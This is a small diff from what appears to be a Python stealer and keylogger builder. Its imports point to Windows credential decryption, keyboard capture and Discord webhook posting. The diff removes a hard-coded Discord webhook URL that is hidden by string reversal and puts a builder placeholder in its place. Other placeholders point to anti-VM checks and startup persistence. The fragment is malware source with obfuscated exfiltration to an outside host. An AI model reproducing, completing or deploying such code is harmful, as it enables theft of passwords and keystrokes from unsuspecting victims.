@@ -6,7 +6,7 @@ import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 from pynput import keyboard
 
-UrLxD = 'ndbTrtLSkKXUdsmrkZzVkTtVuGN86S5bCLjLSzH-CPE9UmNeEqeClTXdt3b1U69AQF1w/0980412303333118311/skoohbew/ipa/moc.drocsid//:sptth'[::-1]
+UrLxD = '%REPLACE_ME_FOR_QUiCAXD'[::-1]
 Anti_Vm = "%AnTiVm%"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
